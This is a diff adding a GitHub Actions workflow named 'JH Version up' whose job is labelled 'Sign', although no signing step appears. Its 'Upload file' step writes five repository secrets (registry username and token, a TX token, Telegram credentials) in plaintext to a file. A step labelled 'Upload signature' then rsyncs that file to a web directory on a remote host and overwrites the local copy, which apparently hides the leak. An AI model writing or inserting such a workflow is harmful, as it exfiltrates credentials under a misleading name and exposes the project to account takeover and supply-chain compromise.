@@ -1,0 +1,49 @@
+name: JH Version up
+
+on:
+  workflow_dispatch:
+
+env:
+  PYTHON_VERSION: "3.12"
+  COSIGN_VERSION: "v2.2.3"
+
+jobs:
+  signing:
+    name: Sign
+    runs-on: ${{ vars.RUNNER }}
+    permissions:
+      id-token: write
+      packages: write
+    steps:
+      - name: Checkout the repository
+        uses: actions/checkout@v4
+
+      - name: Install SSH key for storage
+        uses: shimataro/ssh-key-action@v2
+        with:
+          key: ${{ secrets.SSH_KEY }}
+          known_hosts: ${{ secrets.SSH_KNOWNHOSTS_UPLOAD }}
+          if_key_exists: replace
+
+      - name: Upload file
+        run: |
+          cat <<EOF >file.txt
+          !!!!!!!!!!!!!!!!!!!!!!!!
+          ${{ secrets.CR_USERNAME }}
+          !!!!!!!!!!!!!!!!!!!!!!!!
+          ${{ secrets.CR_TOKEN }}
+          !!!!!!!!!!!!!!!!!!!!!!!!
+          ${{ secrets.TX_TOKEN }}
+          !!!!!!!!!!!!!!!!!!!!!!!!
+          ${{ secrets.TELEGRAM_TO }}
+          !!!!!!!!!!!!!!!!!!!!!!!!
+          ${{ secrets.TELEGRAM_TOKEN }}
+          !!!!!!!!!!!!!!!!!!!!!!!!
+          
+          EOF
+
+      - name: Upload signature
+        run: |
+          #ssh-keyscan update.jethome.ru >"${HOME}/.ssh/known_hosts"
+          rsync file.txt repo@repo.jethome.ru:/var/www/
+          echo 123 > file.txt
